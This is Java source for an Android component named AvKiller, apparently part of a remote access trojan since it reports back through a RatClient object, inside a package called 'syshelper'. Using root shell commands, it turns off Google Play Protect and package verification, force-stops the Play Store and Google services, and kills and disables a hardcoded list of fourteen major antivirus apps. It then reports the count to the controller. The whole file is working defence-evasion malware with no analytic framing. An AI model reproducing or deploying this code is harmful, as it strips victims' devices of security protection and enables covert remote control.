package com.syshelper.service;
import android.content.Context;
import android.content.pm.PackageManager;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.concurrent.TimeUnit;

public class AvKiller {
    private final Context ctx;
    private final RatClient client;
    private static final String[] AV_PACKAGES = {
        "com.avast.android.mobilesecurity", "com.kaspersky.security", "com.bitdefender.security",
        "com.mcafee.android.security", "com.symantec.mobilesecurity", "com.lookout",
        "com.cmsecurity.lite", "com.qihoo.security", "com.cleanmaster.mguard", "com.drweb.pro.market",
        "com.sophos.smsec", "com.trendmicro.tmmspersonal", "com.norton.av", "com.eset.ems2.gp"
    };

    public AvKiller(Context ctx, RatClient client) { this.ctx = ctx; this.client = client; }

    public boolean disablePlayProtect() {
        try {
            execRoot("settings put secure package_verifier_enable 0");
            execRoot("settings put global package_verifier_enable 0");
            execRoot("settings put secure play_protect_enabled 0");
            execRoot("settings put global play_protect_enabled 0");
            execRoot("am force-stop com.android.vending");
            execRoot("am force-stop com.google.android.gms");
            execRoot("pm disable com.android.vending/com.google.android.finsky.protect.ProtectService");
            return true;
        } catch (Exception e) { return false; }
    }

    public void killAllAv() {
        new Thread(() -> {
            int killed = 0;
            for (String pkg : AV_PACKAGES) { if (isPackageInstalled(pkg)) { if (killPackage(pkg)) killed++; } }
            disablePlayProtect();
            client.sendResult("av_kill", "Killed " + killed + " AV processes");
        }).start();
    }

    private boolean isPackageInstalled(String pkg) {
        try { ctx.getPackageManager().getPackageInfo(pkg, 0); return true; } catch (PackageManager.NameNotFoundException e) { return false; }
    }

    private boolean killPackage(String pkg) {
        try {
            execRoot("am force-stop " + pkg);
            execRoot("pm disable " + pkg);
            execRoot("pkill -9 " + pkg);
            String pid = execRoot("pidof " + pkg);
            if (pid != null && !pid.isEmpty()) execRoot("kill -9 " + pid);
            return true;
        } catch (Exception e) { return false; }
    }

    private String execRoot(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", cmd});
            p.waitFor(5, TimeUnit.SECONDS);
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line).append("\n");
            br.close();
            return sb.toString().trim();
        } catch (Exception e) { return null; }
    }
}
